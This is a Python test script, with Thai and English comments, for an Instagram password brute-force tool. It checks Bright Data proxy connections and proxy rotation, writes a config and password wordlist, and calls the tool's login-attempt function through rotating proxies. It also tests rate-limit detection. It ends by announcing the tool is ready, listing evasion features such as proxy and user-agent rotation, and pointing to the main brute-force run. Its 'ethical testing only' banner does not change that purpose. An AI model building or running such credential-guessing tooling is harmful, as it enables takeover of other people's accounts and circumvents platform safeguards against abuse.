#!/usr/bin/env python3
"""
🧪 Test Proxy Integration with Brute Force
ทดสอบการทำงานของพรอกซี่กับระบบ brute force
"""

import time
import json
from datetime import datetime
from brute_force import InstagramBruteForce
from modules.proxy_manager import ProxyManager

def test_proxy_connection():
    """ทดสอบการเชื่อมต่อพรอกซี่"""
    print("🌟 Testing Proxy Connection")
    print("=" * 50)
    
    proxy_manager = ProxyManager()
    
    # Test basic connection
    print("1. Testing basic proxy connection...")
    success = proxy_manager.test_connection()
    
    if success:
        print("✅ Basic proxy connection successful!")
        
        # Test Bright Data features
        print("\n2. Testing Bright Data advanced features...")
        proxy_manager.test_bright_data_features()
        
        return True
    else:
        print("❌ Proxy connection failed!")
        return False

def test_brute_force_with_proxy():
    """ทดสอบ brute force พร้อมพรอกซี่"""
    print("\n🔓 Testing Brute Force with Proxy")
    print("=" * 50)
    
    # สร้าง test config
    test_config = {
        "request_delay": 2,
        "max_attempts": 3,
        "max_concurrent": 1,
        "use_proxy": True,
        "proxy_rotation_interval": 2,
        "proxy_retry_limit": 2,
        "wordlists": ["test_passwords.txt"],
        "targets": ["test_account_proxy"],
        "output_file": "test_proxy_brute_results.json",
        "session_output": "test_proxy_sessions.json"
    }
    
    # บันทึก test config
    with open("test_proxy_config.json", "w", encoding="utf-8") as f:
        json.dump(test_config, f, indent=2, ensure_ascii=False)
    
    # สร้าง test password list
    test_passwords = ["wrongpass1", "wrongpass2", "wrongpass3"]
    with open("test_passwords.txt", "w", encoding="utf-8") as f:
        for pwd in test_passwords:
            f.write(f"{pwd}\n")
    
    print("📝 Created test configuration and wordlist")
    
    # เริ่มทดสอบ
    brute_force = InstagramBruteForce("test_proxy_config.json")
    
    print("\n🎯 Testing proxy session creation...")
    session = brute_force.create_session_with_proxy()
    
    if session.proxies:
        print("✅ Proxy session created successfully!")
        print(f"   Proxy: {list(session.proxies.values())[0][:50]}...")
        
        # ทดสอบการหมุนเวียนพรอกซี่
        print("\n🔄 Testing proxy rotation...")
        rotated_session = brute_force.create_session_with_proxy(rotate_proxy=True)
        
        if rotated_session.proxies:
            print("✅ Proxy rotation successful!")
            print(f"   New proxy: {list(rotated_session.proxies.values())[0][:50]}...")
        else:
            print("❌ Proxy rotation failed!")
            
        return True
    else:
        print("❌ Proxy session creation failed!")
        return False

def test_error_handling():
    """ทดสอบการจัดการ error และ rate limiting"""
    print("\n⚠️ Testing Error Handling and Rate Limiting")
    print("=" * 50)
    
    brute_force = InstagramBruteForce("test_proxy_config.json")
    
    # ทดสอบการจัดการ proxy error
    print("1. Testing proxy error handling...")
    
    # สร้าง session พร้อม invalid proxy เพื่อทดสอบ fallback
    import requests
    test_session = requests.Session()
    test_session.proxies = {"http": "http://invalid:8080", "https": "http://invalid:8080"}
    
    result = brute_force.attempt_login("test_account", "test_password", test_session)
    success, attempt_result = result
    
    if not success and "error" in attempt_result:
        print("✅ Proxy error handling working correctly!")
        print(f"   Error: {attempt_result['error']}")
    else:
        print("❌ Proxy error handling not working as expected")
    
    print("\n2. Testing rate limit detection...")
    
    # Test rate limit simulation (this will likely fail, which is expected)
    normal_session = brute_force.create_session_with_proxy()
    result = brute_force.attempt_login("nonexistent_account_test", "wrong_password", normal_session)
    success, attempt_result = result
    
    print(f"   Rate limit detection: {'✅' if 'rate' in attempt_result.get('error', '').lower() else '❌'}")

def main():
    """ฟังก์ชันหลักสำหรับทดสอบ"""
    print("🧪 Proxy Integration Test Suite")
    print("=" * 60)
    print("⚠️ ETHICAL TESTING ONLY:")
    print("- ใช้เฉพาะกับบัญชีทดสอบของตัวเอง")
    print("- ไม่ทำการโจมตีบัญชีจริง")
    print("- การทดสอบนี้จะใช้ข้อมูลปลอมเท่านั้น")
    print("=" * 60)
    
    # Test 1: Proxy Connection
    proxy_ok = test_proxy_connection()
    
    if proxy_ok:
        # Test 2: Brute Force with Proxy
        brute_ok = test_brute_force_with_proxy()
        
        if brute_ok:
            # Test 3: Error Handling
            test_error_handling()
            
            print("\n🎉 All tests completed!")
            print("\n📊 Test Summary:")
            print("✅ Proxy connection: PASSED")
            print("✅ Brute force integration: PASSED") 
            print("✅ Error handling: TESTED")
            
            print("\n🚀 Your brute force tool is ready with advanced proxy support!")
            print("\nFeatures enabled:")
            print("- ✅ Bright Data proxy integration")
            print("- ✅ Automatic proxy rotation")
            print("- ✅ Rate limit detection")
            print("- ✅ Error handling and fallback")
            print("- ✅ User agent rotation")
            print("- ✅ Session management")
            
        else:
            print("\n❌ Brute force proxy integration failed!")
    else:
        print("\n❌ Proxy connection test failed!")
        print("Please check your proxy_config.json settings")

    print("\n📁 Test files created:")
    print("- test_proxy_config.json")
    print("- test_passwords.txt")
    print("- test_proxy_brute_results.json (if test ran)")
    
    print("\n🔧 Next steps:")
    print("1. Verify your proxy credentials in proxy_config.json")
    print("2. Run the main brute force with: python run_brute_force.py")
    print("3. Monitor results in brute_results.json")

if __name__ == "__main__":
    main()
